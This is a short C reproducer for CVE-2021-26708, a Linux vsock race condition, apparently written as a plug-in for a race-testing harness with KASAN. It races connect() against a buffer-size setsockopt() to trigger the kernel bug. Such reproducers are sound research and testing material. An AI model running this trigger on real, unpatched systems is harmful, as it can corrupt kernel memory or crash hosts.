/*
[COMMIT]
fix: c518adafa39f
parent: 938e0fcd3253

[COMPILE]
single-event
compiled with GCC 10.4, defconfig, with KASAN

[REF]
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <unistd.h>
#include <sys/socket.h>

static int vsock;
static struct sockaddr_vm addr = {
    .svm_family = AF_VSOCK,
};
static int size;

unsigned long long racee_delay, racer_delay;

void do_setup(void)
{
    return;
}

void setup_one(void)
{
    int ret;
    unsigned long dummy; 

    vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (vsock == -1) {
        perror("[-] create vsock failed");
        exit(-1);
    }

    dummy = 1;
    ret = setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE, &dummy, sizeof(unsigned long));
    if (ret == -1) {
        perror("[-] setsockopt 1 failed");
        exit(-1);
    }

    dummy = 0xfffffffffffffffdlu;
    ret = setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE, &dummy, sizeof(unsigned long));
    if (ret == -1) {
        perror("[-] setsockopt 2 failed");
        exit(-1);
    }

    addr.svm_cid = VMADDR_CID_LOCAL;
	ret = connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
    size = random();
    srandom(size);
}

void sys_racer(void)
{
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));
}

void sys_racee(void)
{
    setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &size, sizeof(unsigned long));
}

void cleanup_one(void)
{
    close(vsock);
}

void do_cleanup(void)
{
    return;
}

int sanity_check(void)
{
    return 0;
}